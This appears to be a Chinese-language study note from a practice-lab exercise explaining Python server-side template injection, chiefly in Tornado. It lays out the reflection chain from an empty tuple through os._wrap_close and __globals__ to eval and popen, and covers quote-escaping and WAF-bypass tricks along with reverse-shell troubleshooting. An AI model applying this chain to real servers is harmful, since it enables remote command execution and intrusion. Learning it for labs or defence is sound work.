最近打靶机碰到一个 Tornado 框架的模板注入，之前只接触过一点皮毛，知道用“().class.bases().subclasses()”列出当前类的根类下的所有子类，但是接下来该怎么构造payload一窍不通了。本文旨在记录SSTI模板注入的原理、如何构造payload以及绕过手法等，方便复习查看。

什么是 SSTI

SSTI，即服务端模板注入（Server-Side Template Injection），本质是用户输入被模板引擎当作代码执行了。例如当提交{{7*7}}时，正常的模板引擎应该把它当作字符串原样渲染，但存在 SSTI 时引擎会解析{{ }}里的表达式，执行7*7在页面输出“49”。

Python生态里常见的模板引擎有Tornado、Jinja2（Flask）、Mako、Django和Template。其中 Tornado 和 Mako 自由度最高——{{ }}里直接写Python，链式反射调用基本不设限。Jinja2 有沙箱，需要绕过滤。Django 最严，往往得靠 Tag 注入而非表达式注入。

核心原理：Python 对象反射链

SSTI的最终目标是远程命令执行（RCE）。Python 的对象模型是这样的：“一切皆对象，每个对象都“记得”自己属于哪个类、继承自哪个父类、定义在哪个模块”。因此在 Python 里，从任意一个无害的内置对象出发，可以通过魔术属性一路追溯到能执行命令的函数。

下面是一条典型的攻击链：

链的每一环：

步骤 表达式 得到的结果 作用
1 () 空元组对象 任意内置类型都可以当起点
2 .__class__ <class 'tuple'> 拿到这个对象所属的类
3 .__bases__[0] <class 'object'> 拿到父类，所有内置类型的直接父类都是 object
4 .__subclasses__() [type, weakref, int, ...] 展开 Python 进程中所有已加载的 object 子类
5 [N] <class 'os._wrap_close'> 从列表中挑出能利用的那个类
6 .__init__ <function __init__> 获取该类的构造函数（function 对象）
7 .__globals__ {'popen': ..., '__builtins__': ...} 获取该函数所在模块的全局命名空间
8 ['__builtins__'] {'eval': ..., 'exec': ...} 拿出内置函数字典
9 ['eval'] <built-in function eval> 拿到 eval
10 ('''...''') — 传入要执行的 Python 代码

为什么__globals__是关键？Python 中每个 function 对象都有一个__globals__属性，指向定义该函数时所在模块的全局命名空间字典os._wrap_close这个类定义在 os 模块里，所以它的__init__.__globals__就是 os 模块的”全局变量表”，这张表里有popen、system、__builtins__等等我们想要的一切。因此这正是整个链条中最核心的一跳：从一个无害的类跳进一个高危模块的内部。

拿到索引后，有三条链路可选：

链路 B — os._wrap_close → popen / system（最常用）

场景 推荐链路
只想看 whoami / id 回显 链路 B，popen().read()
要反弹 shell 链路 C，eval() + 三重引号
Python 版本老（< 3.6） 链路 A，Popen 直连

注意点：引号嵌套与特殊字符

cmd 命令需要引号，Python 代码也需要引号，而模板解析器以}}为唯一终结符——中间的字符一旦被误读，整个表达式解析失败。

三种引号的包容关系

真实命令往往同时包含'和"，比如反弹 shell 命令：外层os.system('...')用单引号，里面bash -c "..."用双引号。这种情况只有三重引号能兜住。

>、&、|破坏 Tornado 解析

这些字符在 Tornado 模板里可能被当成模板语法的一部分，导致ParseError。那么就不要直接在模板表达式里拼 shell 命令，而是用eval()把整条命令写成 Python 字符串，从而使>、&等变成字符串内部的普通文本，不再干扰模板解析。

四种绕过策略

  1. 三重引号（首选）：eval('''...''')，能够处理95%的场景
  2. hex 转义：\x27替代'，\x22替代"，字符不多时可用
  3. chr() 拼接：chr(105)+chr(100)拼出id，仅在 WAF 拦截所有引号时用
  4. 拆分执行：先把命令 base64 写入文件，再执行文件，用于命令中含>、&、|等 shell 元字符的情况

常见踩坑

__builtins__是 dict 还是 module？

不同执行上下文中__builtins__类型不同：

  • 在__main__模块中：builtins模块对象 → 访问属性用.eval或.__dict__['eval']
  • 在其他模块（如 os）中：builtins.__dict__（一个 dict）→ 直接['eval']索引

遇到TypeError: 'module' object is not subscriptable就换.__dict__['eval']或.eval。

curl 没回显 ≠ payload 失败

浏览器里能拿到回显，curl 却返回空或跳/login——大概率是目标有登录认证，curl 没带 cookie。只需要在浏览器复制 Cookie，curl 加 -b 参数带上。

确认 RCE 但 shell 不回来

分步排查：先确认目标能出网（curl你的攻击机），再确认端口没被防火墙拦。都不行就换回连方式——bash 反弹、nc 反弹、Python 反弹分别尝试。
